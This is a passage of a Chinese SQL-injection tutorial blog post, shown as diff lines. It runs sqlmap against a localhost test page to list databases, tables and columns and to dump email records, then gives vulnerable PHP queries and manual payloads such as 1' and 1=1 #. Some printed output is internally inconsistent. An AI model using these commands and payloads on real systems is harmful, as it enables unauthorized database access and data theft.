payloads specific for other DBMSes? [Y/n]</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap 报告了参数<code>id</code>可能存在注入。</p>
+<p>如果参数在 HTTP 正文或者 Cookie 中，可以使用<code>--data &lt;data&gt;</code>以及<code>--cookie &lt;cookie&gt;</code>来提交数据。</p>
+<h3 id="获取数据库及用户名称"><a href="#获取数据库及用户名称" class="headerlink" title="获取数据库及用户名称"></a>获取数据库及用户名称</h3><p><code>--dbs</code>用于获取所有数据库名称，<code>--current-db</code>用于获取当前数据库，<code>--current-user</code>获取当前用户。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\asus&gt; sqlmap -u http://localhost/sql.php?id= -p id --current-db</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[12:10:44] [INFO] fetching current database</span><br><span class="line">[12:10:54] [INFO] retrieved: test</span><br><span class="line">current database:    &apos;test&apos;</span><br><span class="line">[12:10:54] [INFO] fetched data logged to text files under &apos;C:\Users\asus\.sqlmap\output\localhost&apos;</span><br><span class="line"></span><br><span class="line">[*] shutting down at 12:10:54</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p><code>-D</code>用于指定数据库名称，如果未指定则获取所有数据库下的表名。<code>--tables</code>用于获取表名。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\asus&gt; sqlmap -u http://localhost/sql.php?id= -p id -D test --tables</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[12:13:25] [INFO] fetching tables for database: &apos;test&apos;</span><br><span class="line">[12:13:28] [INFO] the SQL query used returns 7 entries</span><br><span class="line">[12:13:30] [INFO] retrieved: email</span><br><span class="line">[12:13:32] [INFO] retrieved: history</span><br><span class="line">[12:13:34] [INFO] retrieved: iris</span><br><span class="line">[12:13:36] [INFO] retrieved: message</span><br><span class="line">[12:13:38] [INFO] retrieved: result</span><br><span class="line">[12:13:40] [INFO] retrieved: sqlinj</span><br><span class="line">[12:13:42] [INFO] retrieved: test_table</span><br><span class="line">Database: test</span><br><span class="line">[7 tables]</span><br><span class="line">+------------+</span><br><span class="line">| email      |</span><br><span class="line">| history    |</span><br><span class="line">| data       |</span><br><span class="line">| message    |</span><br><span class="line">| result     |</span><br><span class="line">| sqlinj     |</span><br><span class="line">| test_table |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">[12:13:42] [INFO] fetched data logged to text files under &apos;C:\Users\asus\.sqlmap\output\localhost&apos;</span><br><span class="line"></span><br><span class="line">[*] shutting down at 12:13:42</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p><code>-T</code>用于指定表名，<code>--columns</code>用于获取列名。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\asus&gt; sqlmap -u http://localhost/sql.php?id= -p id -D test -T email --columns</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[12:15:02] [INFO] fetching columns for table &apos;email&apos; in database &apos;test&apos;</span><br><span class="line">[12:15:04] [INFO] the SQL query used returns 2 entries</span><br><span class="line">[12:15:06] [INFO] retrieved: userid</span><br><span class="line">[12:15:08] [INFO] retrieved: varchar(16)</span><br><span class="line">[12:15:11] [INFO] retrieved: email</span><br><span class="line">[12:15:14] [INFO] retrieved: varchar(32)</span><br><span class="line">Database: test</span><br><span class="line">Table: email</span><br><span class="line">[2 columns]</span><br><span class="line">+--------+-------------+</span><br><span class="line">| Column | Type        |</span><br><span class="line">+--------+-------------+</span><br><span class="line">| email  | varchar(32) |</span><br><span class="line">| userid | varchar(16) |</span><br><span class="line">+--------+-------------+</span><br><span class="line"></span><br><span class="line">[12:15:30] [INFO] fetched data logged to text files under &apos;C:\Users\asus\.sqlmap\output\localhost&apos;</span><br><span class="line"></span><br><span class="line">[*] shutting down at 12:15:30</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取记录"><a href="#获取记录" class="headerlink" title="获取记录"></a>获取记录</h3><p><code>--dump</code>用于获取记录，使用<code>-C</code>指定列名的话是获取某一列的记录，不指定就是获取整个表。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\asus&gt; sqlmap -u http://localhost/sql.php?id= -p id -D test -T email --dump</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[12:16:59] [INFO] fetching columns for table &apos;email&apos; in database &apos;test&apos;</span><br><span class="line">[12:16:59] [INFO] the SQL query used returns 2 entries</span><br><span class="line">[12:16:59] [INFO] resumed: userid</span><br><span class="line">[12:16:59] [INFO] resumed: varchar(16)</span><br><span class="line">[12:16:59] [INFO] resumed: email</span><br><span class="line">[12:16:59] [INFO] resumed: varchar(32)</span><br><span class="line">[12:16:59] [INFO] fetching entries for table &apos;email&apos; in database &apos;test&apos;</span><br><span class="line">[12:17:01] [INFO] the SQL query used returns 2 entries</span><br><span class="line">[12:17:04] [INFO] retrieved: test2@example.com</span><br><span class="line">[12:17:06] [INFO] retrieved: 123</span><br><span class="line">[12:17:08] [INFO] retrieved: wizard.z@qq.com</span><br><span class="line">[12:17:10] [INFO] retrieved: 233837063867287</span><br><span class="line">[12:17:10] [INFO] analyzing table dump for possible password hashes</span><br><span class="line">Database: test</span><br><span class="line">Table: email</span><br><span class="line">[2 entries]</span><br><span class="line">+-----------------+-------------------+</span><br><span class="line">| userid          | email             |</span><br><span class="line">+-----------------+-------------------+</span><br><span class="line">| 123             | test2@example.com |</span><br><span class="line">| 233837063867287 | test@example.com  |</span><br><span class="line">+-----------------+-------------------+</span><br><span class="line"></span><br><span class="line">[12:17:10] [INFO] table &apos;test.email&apos; dumped to CSV file &apos;C:\Users\asus\.sqlmap\output\localhost\dump\test\email.csv&apos;</span><br><span class="line">[12:17:10] [INFO] fetched data logged to text files under &apos;C:\Users\asus\.sqlmap\output\localhost&apos;</span><br><span class="line"></span><br><span class="line">[*] shutting down at 12:17:10</span><br></pre></td></tr></table></figure>
+
+<h2 id="文本型注入点"><a href="#文本型注入点" class="headerlink" title="文本型注入点"></a>文本型注入点</h2><p>上面我们一直在讲解数值型注入点，如果我们把 SQL 语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select id, info from sqlinj where id=$id"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>改为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select id, info from sqlinj where id='$id'"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>那么在测试的时候就会出现<code>1=1</code>和<code>1=2</code>都存在的情况。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-2d93d78398143cb8.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.jpg"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-61e0adaa697b1413.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.jpg"></p>
+<p>这时我们就不知道它是过滤了还是真的有注入点。所以我们可以修改参数，用一个单引号闭合前面的引号，再用一个注释符号（<code>#</code>或者<code>--</code>）来注释掉后面的引号：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=1 #</span><br><span class="line">1&apos; and 1=2 #</span><br><span class="line">1&apos; order by ? #</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><ul>
+<li><p><a href="http://www.websec.ca/kb/sql_injection" target="_blank" rel="noopener">The SQL Injection Knowledge Base</a></p>
+</li>
+<li><p><a href="http://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之SQL Injection</a></p>
+</li>
+<li><p><a href="http://www.freebuf.com/articles/web/120985.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)</a></p>
+</li>
+<li><p><a href="http://blog.csdn.net/wizardforcel/article/details/50695931" target="_blank" rel="noopener">SqlMap用户手册</a></p>
+</li>
+<li><p><a href="http://blog.csdn.net/mydriverc2/article/details/41390319" target="_blank" rel="noopener">sqlmap用户手册(续)</a></p>
+</li>
+<li><p><a href="http://blog.csdn.net/wizardforcel/article/details/59480461" target="_blank" rel="noopener">MySQL 手工注入常用语句</a></p>
+</li>
+<li><p><a href="http://www.jianshu.com/p/bd3daa312fe5" target="_blank" rel="noopener">Kali Linux Web 渗透测试秘籍 第六章 利用 – 低悬的果实</a></p>
+</li>
+<li><p><a href="http://www.jianshu.com/p/f671bc45b7f1" target="_blank" rel="noopener">Kali Linux Web 渗透测试秘籍 第七章 高级利用</a></p>
+</li>
+</ul>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>John Doe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2019/12/04/漏洞篇 SQL注入/">http://yoursite.com/2019/12/04/漏洞篇 SQL注入/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/12/04/漏洞篇 CSRF/"></a>
+            
+            
+            <a class="next" rel="next" href="/2019/12/04/漏洞篇 SSRF/"></a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© John Doe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
